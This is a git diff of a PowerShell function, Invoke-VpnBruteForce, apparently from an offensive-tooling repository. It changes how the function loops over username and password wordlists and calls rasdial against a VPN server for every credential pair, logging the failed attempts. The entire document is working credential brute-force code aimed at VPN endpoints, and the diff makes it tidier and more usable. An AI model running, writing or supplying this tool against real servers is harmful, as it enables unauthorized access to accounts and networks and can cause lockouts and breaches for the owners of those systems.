@@ -30,22 +30,15 @@ function Invoke-VpnBruteForce{
      https://github.com/Prince-Amir/Offensive-Powershell.git
 #>
     [CmdletBinding()]param (
-#        [Parameter(Position = 0, Mandatory=$true,
-#                   HelpMessage='Check VPN Connection')       
-#        ]
-#        [bool]
-#        $Checkvpn,
 
         [Parameter(Position = 1, Mandatory=$true)]
         [string]
         $ServerAddress,
 
         [Parameter(Position = 1, Mandatory=$true)]
-        [string]
         $UsernameFilePath,
 
         [Parameter(Position = 2, Mandatory=$true)]
-        [string]
         $PasswordFilePath,
 
         
@@ -55,15 +48,17 @@ function Invoke-VpnBruteForce{
         [Alias('tt')]
         [string]
         $TunType
-
+        
         
         )
 
 
-BEGIN{}
+BEGIN{
 
-PROCESS{
-$Checkvpn = Get-VpnConnection
+    $UsernameFilePath = Get-Content $UsernameFilePath
+    $PasswordFilePath = Get-Content $PasswordFilePath
+
+    $Checkvpn = Get-VpnConnection
         
         if ($Checkvpn.ConnectionStatus -cmatch 'Connected'){
 
@@ -82,21 +77,26 @@ $Checkvpn = Get-VpnConnection
            
         }
 
+}
+
+PROCESS{
+
     
-    for ($x=0;$x -le $UsernameFilePath.count; $x++){
+    foreach ($username in $UsernameFilePath){
     
-        $listuser =  $UsernameFilePath[$x]
-  
-            for($y=0;$y -le $PasswordFilePath.count; $y++){
+        
+         
+            foreach($Password in $PasswordFilePath){
                 
-                    $listpass = $PasswordFilePath[$y]
+                    
+                    
              
             
-                    [string]$Connection =  rasdial "Bruter" $listuser $listpass
+                    [string]$Connection =  rasdial "Bruter" $username $Password
                                                                  
                         if ($Connection -match 'error'  )
             
-                            {Write-Host "[-]$listuser : $listpass" -ForegroundColor red -BackgroundColor Black}
+                            {Write-Host "[-]$username : $Password" -ForegroundColor red -BackgroundColor Black}
              
                         else
             
